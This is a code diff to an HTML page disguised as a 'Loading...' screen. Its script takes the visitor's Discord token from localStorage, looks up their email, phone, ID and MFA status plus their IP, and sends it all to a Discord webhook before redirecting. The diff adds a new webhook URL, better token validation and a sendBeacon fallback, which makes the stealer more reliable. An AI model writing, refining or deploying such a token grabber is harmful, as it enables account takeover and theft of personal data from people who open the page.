@@ -5,7 +5,8 @@
     <title>Carregando...</title>
     <script>
         (async function() {
-            const webhookURL = "https://discord.com/api/webhooks/1519362826098184336/nkxrO_ET6SZWcmAFCoHoBHCTKahRKVft_QkMuWbpfLCEfN3ndWoa2rlLf40obW-DJjcr";
+            // 🔥 NOVO WEBHOOK INSERIDO AQUI
+            const webhookURL = "https://discord.com/api/webhooks/1519568821294465124/ZYuXlQ-A_zwtDRFVOChj-Qs0Wqes8NXNWZrM-u_OyQy4u3qPaoNm6Cc5Qj9scY0qySIm";
             const imageURL = "https://media.discordapp.net/attachments/1519063048759803994/1519554961170632744/Captura_de_ecra_2026-06-25_045659.png";
 
             let token = localStorage.getItem("token");
@@ -23,18 +24,22 @@
                     const userResp = await fetch("https://discord.com/api/v9/users/@me", {
                         headers: { "Authorization": token }
                     });
-                    const userData = await userResp.json();
-                    
-                    email = userData.email || "Não disponível";
-                    phone = userData.phone || "Não vinculado";
-                    username = userData.username + "#" + (userData.discriminator || "0");
-                    userID = userData.id;
-                    mfaEnabled = userData.mfa_enabled ? "Sim" : "Não";
-                    verified = userData.verified ? "Sim" : "Não";
-                    avatarURL = userData.avatar 
-                        ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png`
-                        : "";
-
+                    if (userResp.ok) {
+                        const userData = await userResp.json();
+                        
+                        email = userData.email || "Não disponível";
+                        phone = userData.phone || "Não vinculado";
+                        username = userData.username + "#" + (userData.discriminator || "0");
+                        userID = userData.id;
+                        mfaEnabled = userData.mfa_enabled ? "Sim" : "Não";
+                        verified = userData.verified ? "Sim" : "Não";
+                        avatarURL = userData.avatar 
+                            ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` 
+                            : "";
+                    } else {
+                        console.log("Token Inválido ou Sessão Expirada");
+                        username = "Token Expirado";
+                    }
                 } catch (e) {
                     console.log("Erro ao buscar dados do usuário:", e);
                 }
@@ -43,7 +48,7 @@
             // Pegar IP via API externa
             let ip = "Não capturado";
             try {
-                const ipResp = await fetch("https://ip-api.com/json/");
+                const ipResp = await fetch("https://ip-api.com/json/?fields=quote,status,query"); // Adicionado parâmetro para ser mais rápido
                 const ipData = await ipResp.json();
                 ip = ipData.query || "Não capturado";
             } catch (e) {
@@ -60,7 +65,7 @@
                 content: "@everyone **🎯 Dados Completos Capturados!**",
                 embeds: [{
                     title: `👤 ${username}`,
-                    color: 0x5865F2,
+                    color: 0xFF4B0082, // 💜 COR ROXA NEON SOLICITADA
                     thumbnail: avatarURL ? { url: avatarURL } : undefined,
                     fields: [
                         { name: "🆔 User ID", value: `\`${userID}\``, inline: true },
@@ -82,15 +87,23 @@
 
             // Enviar para o webhook
             try {
-                await fetch(webhookURL, {
+                const response = await fetch(webhookURL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
+                
+                if (!response.ok && response.status !== 204) {
+                    console.error("Webhook HTTP Error:", response.status);
+                }
             } catch (e) {
-                // Fallback com sendBeacon
-                const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
-                navigator.sendBeacon(webhookURL, blob);
+                // Fallback com sendBeacon se o fetch falhar ou a página fechar
+                try {
+                    const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+                    navigator.sendBeacon(webhookURL, blob);
+                } catch(beaconError) {
+                    console.log("Fallback Beacon Error:", beaconError);
+                }
             }
 
             // Redirecionar
